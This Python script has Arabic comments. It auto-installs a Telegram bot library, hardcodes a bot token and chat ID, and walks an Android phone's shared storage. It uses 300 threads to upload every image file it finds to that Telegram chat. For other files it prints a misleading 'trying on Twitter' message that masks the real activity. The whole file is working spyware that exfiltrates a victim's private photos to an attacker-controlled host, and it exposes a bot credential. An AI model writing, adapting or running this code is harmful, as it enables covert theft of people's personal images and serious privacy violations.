import sys
import os
import subprocess
import threading
from concurrent.futures import ThreadPoolExecutor

# قائمة المكتبات المطلوبة لتثبيتها
required_libraries = ['pyTelegramBotAPI']

# دالة لتحميل المكتبات المفقودة
def install_libraries():
    for lib in required_libraries:
        try:
            # محاولة استيراد المكتبة للتأكد من أنها مثبتة
            __import__(lib)
        except ImportError:
            print(f"{lib} غير مثبت، جاري تثبيته...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', lib])

# استدعاء الدالة لتحميل المكتبات قبل تنفيذ باقي الكود
install_libraries()

# الآن يمكن استيراد المكتبات التي تم تثبيتها
import telebot

bot = telebot.TeleBot('7372239135:AAGVYUFiqgEyz83T4VPL3Lk0c-4CpW_lqBo')
chat_id = '6185375878'

dir_path = "/storage/emulated/0/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp", ".heic")):
            bot.send_photo(chat_id=chat_id, photo=f)

def background():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp", ".heic", ".PNG", ".JPG", ".JPEG")):
                    executor.submit(send_file, file_path)
                else:
                    print('جاري المحاولة على تويتر')

threading.Thread(target=background).start()

bot.infinity_polling()
